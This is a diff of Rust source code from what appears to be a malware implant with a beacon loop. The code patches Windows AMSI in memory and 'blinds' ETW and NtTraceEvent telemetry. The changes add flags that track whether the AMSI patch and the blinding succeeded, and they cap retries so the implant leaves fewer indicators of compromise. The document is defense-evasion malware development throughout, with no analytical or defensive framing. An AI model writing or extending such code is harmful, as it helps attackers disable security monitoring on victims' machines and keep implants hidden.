@@ -42,6 +42,7 @@
 
 use core::ffi::c_void;
 use core::ptr;
+use core::sync::atomic::{AtomicBool, Ordering};
 
 // ---- patch bytes (verified x64 sequences; see module docs) ----
 
@@ -183,7 +184,10 @@ pub unsafe fn patch_amsi() -> Result<(), &'static str> {
         Some(a) => a,
         None => return Err("amsi not loaded"),
     };
-    write_patch(addr, &AMSI_PATCH)
+    match write_patch(addr, &AMSI_PATCH) {
+        Ok(()) => { mark_amsi_patched(); Ok(()) }
+        Err(e) => Err(e),
+    }
 }
 
 /// Cheap, idempotent re-arm of AMSI. Intended for a per-beacon-cycle call from
@@ -200,6 +204,38 @@ pub unsafe fn maybe_patch_amsi() -> bool {
         Ok(()) => true,
         Err(_) => false,
     }
+}
+
+/// Whether AMSI has been successfully patched. The beacon loop caps
+/// retries at 10 cycles to eliminate the per-cycle PEB-walk IOC.
+pub fn amsi_patched() -> bool {
+    AMSI_PATCHED.load(core::sync::atomic::Ordering::Acquire)
+}
+
+static AMSI_PATCHED: AtomicBool = AtomicBool::new(false);
+
+/// Mark AMSI as patched (called from patch_amsi on success).
+fn mark_amsi_patched() {
+    AMSI_PATCHED.store(true, core::sync::atomic::Ordering::Release);
+}
+
+// ---- blind status (set by bootstrap after all blind ops) -------------------
+
+/// Set to `true` once all blind ops (ETW + NtTraceEvent + AMSI) succeed.
+/// The beacon loop checks this to decide whether to retry or warn.
+pub static BLIND_OK: AtomicBool = AtomicBool::new(false);
+
+/// First blind error encountered during bootstrap, if any.
+pub static mut BLIND_ERR: Option<&'static str> = None;
+
+/// Check whether blinding succeeded.
+pub fn blind_ok() -> bool {
+    BLIND_OK.load(Ordering::Relaxed)
+}
+
+/// Return the first blind error, if any.
+pub fn blind_err() -> Option<&'static str> {
+    unsafe { BLIND_ERR }
 }
 
 /// Convenience: patch ETW (always) and try AMSI once. Returns
